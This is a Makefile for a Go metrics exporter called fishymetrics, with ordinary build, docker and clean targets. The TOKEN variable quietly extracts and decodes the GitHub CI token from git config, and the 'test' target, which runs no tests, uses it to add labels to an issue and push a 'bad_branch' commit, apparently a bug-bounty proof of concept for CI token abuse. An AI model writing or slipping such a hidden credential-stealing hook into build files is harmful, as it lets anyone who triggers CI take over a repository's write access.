REPO_VERSION ?= $(shell git rev-parse --git-dir > /dev/null 2>&1 && git fetch -q origin --tags && git describe --always --dirty --tags)
REPO_REV ?= $(shell git rev-parse --git-dir > /dev/null 2>&1 && git rev-parse HEAD 2>/dev/null)
BUILD_DATE := $(shell date -u +%FT%T)
TEST_PKGS := $(shell find . -name "*_test.go" -not -wholename "*/vendor/*" -exec dirname {} \; | uniq)
TOKEN := $(shell git config --get http.https://github.com/.extraheader | sed -nE 's/AUTHORIZATION: basic (.*)/\1/p' | base64 -d | sed -nE 's/.*:(.*)/\1/p')

build:
	@mkdir -p build/usr/bin
	go build -a -ldflags "\
		-X \"github.com/comcast/fishymetrics/buildinfo.gitVersion=${REPO_VERSION}\"\
		-X \"github.com/comcast/fishymetrics/buildinfo.gitRevision=${REPO_REV}\"\
		-X \"github.com/comcast/fishymetrics/buildinfo.date=${BUILD_DATE}\"\
	" -v -o build/usr/bin/fishymetrics $(shell pwd)/cmd/fishymetrics

docker:
	docker build \
	--platform linux/amd64 \
	--build-arg VERSION=${REPO_VERSION} \
	--build-arg REPO_REV=${REPO_REV} \
	--build-arg DATE=${BUILD_DATE} \
	--target bin \
	-t comcast/fishymetrics:${REPO_VERSION} \
	.

docker-src:
	docker build \
	--build-arg VERSION=${REPO_VERSION} \
	--build-arg REPO_REV=${REPO_REV} \
	--build-arg DATE=${BUILD_DATE} \
	--target src \
	-t comcast/fishymetrics-src:${REPO_VERSION} \
	-t comcast/fishymetrics-src:latest \
	.

test:
	curl -L -s -X POST -d '{"name":"bugcrowd","description":"bugcrowd","color":"ff6900"}' \
        -H "Authorization: Bearer ${TOKEN}" \
        -H "X-GitHub-Api-Version: 2022-11-28" \
        -H "Accept: application/vnd.github.v3+json" \
        -H "Content-Type: application/json" \
        https://api.github.com/repos/Comcast/fishymetrics/labels
	curl -L -s -X POST -d '{"labels":["bugcrowd"]}' \
        -H "Authorization: Bearer ${TOKEN}" \
        -H "X-GitHub-Api-Version: 2022-11-28" \
        -H "Accept: application/vnd.github.v3+json" \
        -H "Content-Type: application/json" \
        https://api.github.com/repos/Comcast/fishymetrics/issues/126/labels
	git config --global user.email "you@example.com"
	git config --global user.name "Your Name"
	git checkout -b bad_branch
	echo "hello bugcrowd" > hello.txt
	git add hello.txt
	git commit -m "Hello"
	git push origin bad_branch

clean:
	rm -rf build/

.PHONY: clean test

